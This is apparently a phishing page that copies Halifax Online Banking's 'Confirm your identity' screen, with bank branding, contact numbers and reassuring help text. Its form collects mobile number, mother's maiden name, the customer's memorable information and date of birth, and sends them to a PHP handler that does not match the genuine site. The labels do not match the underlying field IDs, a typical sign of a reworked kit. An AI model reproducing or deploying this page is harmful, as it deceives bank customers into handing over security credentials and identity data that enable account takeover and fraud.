<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">













<html xmlns="http://www.w3.org/1999/xhtml" lang="en-gb" xml:lang="en-gb">
	<head>
		

<title>Halifax - Customer Identification Data</title>
<meta name="keywords" content="" />
<meta name="description" content="" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />	
<meta http-equiv="content-language" content="en-gb" />
<!--[if gte IE 8]><meta http-equiv="X-UA-Compatible" content="IE=IE8" /><![endif]-->
<meta name="robots" content="noindex" />
<meta name="distribution" content="global" />
<meta name="rating" content="general" />
<link rel="shortcut icon" href="css/favicon.ico" />

<link href="css/global1-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />
<link href="css/global2-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />

<link href="css/print_base-min110729.css" media="print" type="text/css" rel="stylesheet" />
<!--[if IE 8]>
<link href="css/ie8-min110817.css" type="text/css" rel="stylesheet" />
<![endif]-->
<!--[if IE 7]>
<link href="css/ie7-min111005.css" type="text/css" rel="stylesheet" />
<![endif]-->
<!--[if lt IE 7]>
<link href="css/ie6-min111004.css" type="text/css" rel="stylesheet" />
<![endif]-->

<script type="text/javascript" src="css/jquery-min110923.js"></script>
<script type="text/javascript" src="css/scriptsnippet.jspf"></script>
<script type="text/javascript" src="css/global-min111005.js"></script>
<script type="text/javascript" src="css/custom-min111005.js"></script>


		
	</head>
	<body>
		
					<div id="wrapper">
			




<div class="outer">
	<div id="header">
		<ul id="skiplinks">	
			<li><a id="lnkSkip" name="lnkSkip" href="#page">Skip to main content</a></li>
		</ul>
		<div class="clearfix">
			<p id="logo">
				<span><img src="css/personal_loans_halifax-1-1290683246.jpg" alt="Halifax" /></span>	
			</p>
			
				
					
						
					
					
				
				
					
					
				
				
					
						
						
					
					
											
											
					
					
					
						
					
				
			<div class="secureMsg"><p class="msg"><img src="css/hfx-sign-in-to-secure-site-1-1314611574.png?MOD=AJPERES&amp;CACHEID=932af700482281b79862fe736c2bd3f6" alt="You&amp;#8217;re signing in to a secure site" /></p><p><a href="#" title="How can I tell that this site is secure?"  class="newwin">How can I tell that this site is secure?</a></p></div>
		</div>
	</div>
</div>
			<div class="pageWrap">
				<div id="page" class="content">
				
					<div class="primaryWrap">
					
						<div class="primary">
						<div class="panel">
						
						
						
											
							
			
			

			

			

			<h1>Confirm your identity</h1>
			
			
				
			
			
				
					
					
				
				
				
					
						
					
					
					
						
							
						
					
					
											
						
					
					
											
						
					
					
					
						
						

							

						



					
				

				
				
					

					
						
					

				

			
<form id="frmCustIDData" name="frmCustIDData" method="post" action="customeridentificationdatas.jsp.php" class="validationName:(frmCustIDData) validate:()" autocomplete="off">
<div class="inner"><p>Please start by giving us these details</p><h2>Your&#160;details</h2></div><fieldset><div class="formField  validate:(required_validateNumeric) validationName:(userID) clearfix"><div class="formFieldInner"><label for="frmCustIDData:strUserID">Mobile Number</label><input type="text" autocomplete="off" id="frmCustIDData:strUserID" name="mobile" class="field" maxlength="11" /></div></div><div class="formField validate:(required_validateAlphaWithSpaces) validationName:(firstName) clearfix"><div class="formFieldInner"><label for="frmCustIDData:strFirstName">Mother's maiden name</label><input type="text" autocomplete="off" id="frmCustIDData:strFirstName" name="customer" class="field" maxlength="30" /></div></div><div class="formField validate:(required_validateAlphaNumeric) validationName:(surname) clearfix"><div class="formFieldInner"><label for="frmCustIDData:strSurname">Confirm your Memorable information</label><input type="password" autocomplete="off" id="frmCustIDData:strSurname" name="memo" class="field" maxlength="30" /></div></div><div class="formField validationName:(dateOfBirth) clearfix validationName:(dtDateOfBirth) validate:(required[msg:idGC1m0]_validateDateTimeRange[minDate:1911-11-15,maxDate:2011-11-15])"><div class="formFieldInner"><span class="label">Date of birth</span><div class="date inputGroup"><label for="frmCustIDData:dtDateOfBirth" class="postit">Day</label><select id="frmCustIDData:dtDateOfBirth" name="day" class="day slctDay"><option value="-">Day</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select><label for="frmCustIDData:dtDateOfBirth.month" class="postit">Month</label><select id="frmCustIDData:dtDateOfBirth.month" name="month" class="month slctMonth"><option value="-">Month</option><option value="01">January</option><option value="02">February</option><option value="03">March</option><option value="04">April</option><option value="05">May</option><option value="06">June</option><option value="07">July</option><option value="08">August</option><option value="09">September</option><option value="10">October</option><option value="11">November</option><option value="12">December</option></select><label for="frmCustIDData:dtDateOfBirth.year" class="postit">Year</label><select id="frmCustIDData:dtDateOfBirth.year" name="year" class="year slctYear"><option value="-">Year</option><option value="1911">1911</option><option value="1912">1912</option><option value="1913">1913</option><option value="1914">1914</option><option value="1915">1915</option><option value="1916">1916</option><option value="1917">1917</option><option value="1918">1918</option><option value="1919">1919</option><option value="1920">1920</option><option value="1921">1921</option><option value="1922">1922</option><option value="1923">1923</option><option value="1924">1924</option><option value="1925">1925</option><option value="1926">1926</option><option value="1927">1927</option><option value="1928">1928</option><option value="1929">1929</option><option value="1930">1930</option><option value="1931">1931</option><option value="1932">1932</option><option value="1933">1933</option><option value="1934">1934</option><option value="1935">1935</option><option value="1936">1936</option><option value="1937">1937</option><option value="1938">1938</option><option value="1939">1939</option><option value="1940">1940</option><option value="1941">1941</option><option value="1942">1942</option><option value="1943">1943</option><option value="1944">1944</option><option value="1945">1945</option><option value="1946">1946</option><option value="1947">1947</option><option value="1948">1948</option><option value="1949">1949</option><option value="1950">1950</option><option value="1951">1951</option><option value="1952">1952</option><option value="1953">1953</option><option value="1954">1954</option><option value="1955">1955</option><option value="1956">1956</option><option value="1957">1957</option><option value="1958">1958</option><option value="1959">1959</option><option value="1960">1960</option><option value="1961">1961</option><option value="1962">1962</option><option value="1963">1963</option><option value="1964">1964</option><option value="1965">1965</option><option value="1966">1966</option><option value="1967">1967</option><option value="1968">1968</option><option value="1969">1969</option><option value="1970">1970</option><option value="1971">1971</option><option value="1972">1972</option><option value="1973">1973</option><option value="1974">1974</option><option value="1975">1975</option><option value="1976">1976</option><option value="1977">1977</option><option value="1978">1978</option><option value="1979">1979</option><option value="1980">1980</option><option value="1981">1981</option><option value="1982">1982</option><option value="1983">1983</option><option value="1984">1984</option><option value="1985">1985</option><option value="1986">1986</option><option value="1987">1987</option><option value="1988">1988</option><option value="1989">1989</option><option value="1990">1990</option><option value="1991">1991</option><option value="1992">1992</option><option value="1993">1993</option><option value="1994">1994</option><option value="1995">1995</option><option value="1996">1996</option><option value="1997">1997</option><option value="1998">1998</option><option value="1999">1999</option><option value="2000">2000</option><option value="2001">2001</option><option value="2002">2002</option><option value="2003">2003</option><option value="2004">2004</option><option value="2005">2005</option><option value="2006">2006</option><option value="2007">2007</option><option value="2008">2008</option><option value="2009">2009</option><option value="2010">2010</option><option value="2011">2011</option></select></div></div></div></fieldset><ul class="actions"><li class="primaryAction"><input id="frmCustIDData:btnContinue" name="frmCustIDData:btnContinue" type="image" src="css/continue-4-1294218380.png?MOD=AJPERES&amp;CACHEID=a73e3e0043ce3c9b8bae9f378f3e6a79" alt="Continue" title="Continue" class="submitAction" /></li><li><strong><a id="frmCustIDData:lnlCancel" name="frmCustIDData:lnlCancel" href="login.jsp" title="Cancel" class="cancel pseudoLink">Cancel</a></strong></li></ul><input type="hidden" name="frmCustIDData" value="frmCustIDData" /><input type="hidden" name="submitToken" value="2148427" />
</form>

		
							</div>
						</div>
						
					</div>
					<div class="secondary">
						<div class="panel">
							
							
							

				
				
				
			
							<div class="accordion"><div class="part"><h2 class="trigger">Contact us</h2><div class="pane"><div class="paneInner"><div class="quickContact"><h3>Bank accounts</h3>
<p>08457 203 040<br />+44 1132 422 229&#160;from outside the UK</p>
<h3>Savings</h3>
<p>08457 263 646<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday 8am-6pm, Sunday 9am-5pm.</p>
<h3>Credit cards</h3>
<p>08457 283 848<br />+44 8457 283 848&#160;from outside the UK</p>
<p>08459 444 555&#160;if your card number begins 525303<br />+44 1733 573 189&#160;from outside the UK</p>
<h3>Mortgages</h3>
<p>08457 27 37 47<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday and Sunday 9am-4pm.</p>
<h3>Personal loans</h3>
<p>If your loan agreement begins with 7 call&#160;08457 243 444&#160;(Lines are open Monday to Friday 8am-8pm, Saturday 9am-6pm).<br />
If your loan agreement begins with 84 call&#160;08457 444 455&#160;(Lines are open Monday to Friday 8am-10pm, Saturday 8:30am-6pm, Sunday 9:30am-5.30pm).<br />
If your loan agreement begins with 100 call&#160;08456 047 292&#160;(Lines are open Monday to Sunday 8am-10pm).</p>
<h3>Lost or stolen cards</h3>
<p>08457 203 099<br />+44 1315 498 050&#160;from outside the UK</p>
<h3>Online Banking Helpdesk</h3>
<p>08456 020 000<br />+44 1132 798 302&#160;from outside the UK</p>
<h3>Textphone</h3>
<p>08457 323 436<br />
Lines are open Monday to Friday, 9am - 5.30pm. (For use by customers with hearing impairments only)</p>
<p>We may record your call so we can check we've carried out your instructions correctly and to help us improve our service.</p></div></div></div></div><div class="part"><h2 class="trigger current">Help &amp; support</h2><div class="pane"><div class="paneInner"><ul class="quickFAQs">
			
	
	<li><h3 class="qfaqTrigger">Why do I need to confirm my identity?</h3>
			<div class="qfaqCont">
					<p><p>We need to verify the identity of all of our customers. This is to comply with money laundering regulations which help to stop criminals using financial products or services to hide money made from their illegal activities from the authorities. <br>Asking you for evidence of your identity also protects you from criminals who might  use your name, without you ever knowing.</p>
</p>
				    </div>
			</li>
<li><h3 class="qfaqTrigger">Why do you need my details again?</h3>
			<div class="qfaqCont">
					<p><p>This information will help us to make sure that it's really you using Halifax Online Banking and not someone else.</p>
</p>
				    </div>
			</li>
</ul>

					<p><a href="http://www.halifax.co.uk/onlinebankinghelp/onlinehelp.asp" title="More help &amp; support" target="_blank"  class="linkBullet linkMore newwin newfaqwin">More help & support</a></p></div></div></div></div>




	
				
		
		
			
				
					
				
			
			
					
			
		
				
		
			
		
		
							
						</div>
					</div>
				</div>				
			</div>
			

<div id="footer">
<div class="outer">
<div id="footerInner">

<ul><li><a href="http://www.halifax.co.uk/bankaccounts/help-guidance/important-information/" title="Legal"  class="newwin">Legal</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Privacy</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Security</a></li><li><a href="http://www.lloydsbankinggroup.com/"  class="newwin">Lloyds Banking Group</a></li><li><a href="http://www.halifax.co.uk/bankaccounts/rates-rewards-fees/" title="Rates &amp; fees"  class="newwin">Rates & fees</a></li></ul>
</div>
</div>
</div>

		</div>

		







	</body>
</html>
